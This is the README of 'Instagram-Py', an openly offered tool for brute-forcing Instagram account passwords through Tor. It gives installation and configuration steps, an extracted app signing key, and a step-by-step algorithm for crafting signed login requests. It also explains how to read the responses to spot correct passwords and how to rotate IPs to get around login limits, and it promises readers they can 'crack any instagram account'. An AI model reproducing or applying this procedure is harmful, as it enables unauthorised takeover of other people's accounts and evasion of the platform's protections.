==============
 Instagram-Py 
==============
.. image:: https://img.shields.io/github/issues/deathsec/instagram-py.svg?style=flat-square   
      :target: https://github.com/deathsec/instagram-py/issues

.. image:: https://img.shields.io/github/forks/deathsec/instagram-py.svg?style=flat-square   
      :target: https://github.com/deathsec/instagram-py/network
      
.. image:: https://img.shields.io/github/stars/deathsec/instagram-py.svg?style=flat-square
      :target: https://github.com/deathsec/instagram-py/stargazers

.. image:: https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square   
      :target: https://raw.githubusercontent.com/deathsec/instagram-py/master/LICENSE

..

    | Instagram-py performs slick brute force attack on Instagram without any type of password limiting
    | and also resumes your attack in ease. 
    
    --DeathSec

  
.. image:: https://raw.githubusercontent.com/deathsec/instagram-py/master/preview.png

.. image:: http://forthebadge.com/images/badges/built-with-love.svg
      :target: #
.. image:: http://forthebadge.com/images/badges/60-percent-of-the-time-works-every-time.svg
      :target: #
      
.. image:: http://forthebadge.com/images/badges/made-with-python.svg
      :target: #
|
| **Instagram-Py** is a simple python script to perform basic **brute force** attack against **Instagram** ,   
| this script can **bypass** login limiting on wrong passwords ,  so basically it can test **infinite number of passwords**.
| Instagram-Py is **proved** and can test **over 6M** passwords on a single instagram account with **less resource** as possible
| This script mimics the activities of the official **instagram android app** and sends request over **tor** so you are secure ,
| but if your **tor** installation is **misconfigured** then the blame is on you.

|
**Depends on**: python3 , tor ,  requests , requests[socks] , stem

==============
 Installation
==============

-------------------------------
 using pip to get Instagram-py
-------------------------------

**Make sure you have got the latest version of pip(>= 9.0 and python(>= 3.6)**

::

 $ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip
 $ sudo pip3 install requests --upgrade
 $ sudo pip3 install requests[socks]
 $ sudo pip3 install stem
 $ sudo pip3 install instagram-py
 $ instagram-py # installed successfully
 $ # Now lets copy the config file to your hard drive!
 $ wget -O ~/instapy-config.json "https://git.io/v5DGy"

------------------------------
    Configuring Instagram-Py
------------------------------

Open your configuration file found in your home directory , this file is **very important**
located at **~/instapy-config.json** , do not change anything except tor configuration

::

 $ vim ~/instapy-config.json # open it with your favorite text editior!

**The configuration file looks like this**

::

 {
  "api-url" : "https://i.instagram.com/api/v1/",
  "user-agent" : "Instagram 10.26.0 Android (18/4.3; 320dp..... ",
  "ig-sig-key" : "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178",
  "ig-sig-version" : "4",
  "tor" : { 
     "server" : "127.0.0.1",
     "port" : "9050",
     "protocol" : "socks5",
     "control" : {
           "password" : "",
           "port" : "9051"
       }
   }
    
 }


**api-url** : do not change this unless you know what you are doing

**user-agent** : do not change this unless you know your stuff

**ig-sig_key** : never change this unless new release, this is extracted from the instagram apk file

**tor** : change everything according to your tor server configuration , do not mess up!

--------------------------------------------
 Configuring Tor server to open control port
--------------------------------------------

open your **tor configuration** file usually located at **/etc/tor/torrc**
::
 
 $ sudo vim /etc/tor/torrc # open it with your text editor
 

**search** for the file for this **specific section**

::

 ## The port on which Tor will listen for local connections from Tor
 ## controller applications, as documented in control-spec.txt.
 #ControlPort 9051
 
**uncomment** 'ControlPort' by deleting the **#** before 'ControlPort' , **now save the file and restart your tor server**

**now you are ready to crack any instagram account , make sure your tor configuration matched ~/instapy-config.json** 

=============
    Usage
=============

**Finally** , now you can use instagram-py!

::

 $ instagram-py your_account_username path_to_password_list


===========
 Algorithm
===========

**Instagram-Py** uses a very simple algorimthm for checking passwords efficiently , this section is dedicated for those who
wish to recreate this program in any other language.

-------------
 What we do
-------------

**Step 1:** Get the magic cookie , which is used to verify device integrity!

Getting the magic cookie is the simplest job , all we need to do is send a get request to **https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=** , where the **guid** get parameter is a random 32 character string.
The random 32 character string can be generator using python's simple **uuid library** , to be specific **v4** of **UUID**.
So finally we just have to request the url **https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=800e88b931bf491fa3b4a7afa4e679eb** and get the cookie named **csrftoken** , if we observe the **response header** we
could see that our cookie only **expires** next **year** the same day. So by this we only have to make this request once
and can use it for a year! How vulnerable is that?... 

.. image:: https://raw.githubusercontent.com/deathsec/instagram-py/master/observations/cookies.png 
      :target: #


**Step 2:** Build a post request with Instagram's signature.

This part is **simple** but may be difficult to setup , first i need to get instagram's signature
which is only present in their free apk from google play , Remember our **Strength can be our Weakness**
, All i have to do reverse engineer the apk and find the signature, lets call it **ig_sig**.

::
 
 ig_sig = 4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178
 ig_version = 4

**Instagram** uses **HMAC Authentication** for login stuff, so lets use python's **hmac library**.
But first we have to build our body which will be encoded in json for it to actually sign with 
**ig_sig** , So the post **body** looks likes this...


::
 
 phone_id   = <RANDOM 32 CHARACTER STRING SEPERATED WITH - on EQUAL INTERVALS>
 _csrftoken = <THE MAGIC COOKIE THAT WE GOT!>
 username   = <TARGET ACCOUNT>
 guid       = <RANDOM 32 CHARACTER STRING SEPERATED WITH - on EQUAL INTERVALS>
 device_id  = android-<RANDOM 16 CHARACTER STRING>
 password   = <PASSWORD TO TRY>
 login_attempt_count = 0


The above will be encoded to **JSON** , So to test the password we have to post the data to this url
**https://i.instagram.com/api/v1/accounts/login/ig_sig_key_version=4&signed_body=<SIGNED BODY>.<URL ENCODED JSON DATA>** .

**<SIGNED BODY>:** using **HMAC** , sign our json encoded data with **ig_sig** and return a hexa value.

**<URL ENCODED JSON DATA>:** the same data in json but we url encode so that it goes properly to insta!

So to test a account with username as **USERNAME** and password with **PASSWORD** we simply request this
url **https://i.instagram.com/api/v1/accounts/login/ig_sig_key_version=4&signed_body=bc90e1b7d430f39152e92b4e7d517bfb231dbe0515ed2071dc784cf876e301c3.%7B%22phone_id%22%3A%20%2232abb45c-f605-4fd7-9b5e-674115516b90%22%2C%20%22_csrftoken%22%3A%20%22PyMH2niVQrk41UIBW0lKilleG7GylluQ%22%2C%20%22username%22%3A%20%22USERNAME%22%2C%20%22guid%22%3A%20%2267ca220c-a9eb-4240-b173-2d253808904d%22%2C%20%22device_id%22%3A%20%22android-283abce46cb0a0bcef4%22%2C%20%22password%22%3A%20%22PASSWORD%22%2C%20%22login_attempt_count%22%3A%20%220%22%7D** 

**Take a look** how I did it... 

.. image:: https://raw.githubusercontent.com/deathsec/instagram-py/master/observations/login_create.png


**Step 3:** With the json response and response code , we determine the password is correct or wrong.

if **We get response 200** then the login is success but if we get **response 400** , We inspect the
**json data** for clues if it is the **correct password or invalid request or too many tries**.
So we inspect the **message** from instagram json response!

**Message = Challenge Required** , then the password is correct but instagram got some questions so
we must wait until the user logs in and answer the question and if we are lucky they will not change
the password and we could login in later(**Most of the time people won't change the password!**)

**Message = The password you entered is incorrect.** , then the password is incorrect for sure , try
another.

**Message as something like word invalid in it then** , some other error so just try again, can happen
because of wordlist encoding error which i ignored because all the worldlist have encoding error!

**Message = Too many tries** , Time change our ip and loop but we don't want to change our magic cookie

**Thats it you just hacked instagram with a very simple algorithm!**

=============
   License
=============

The MIT License,

Copyright (C) 2017 The Future Shell , DeathSec
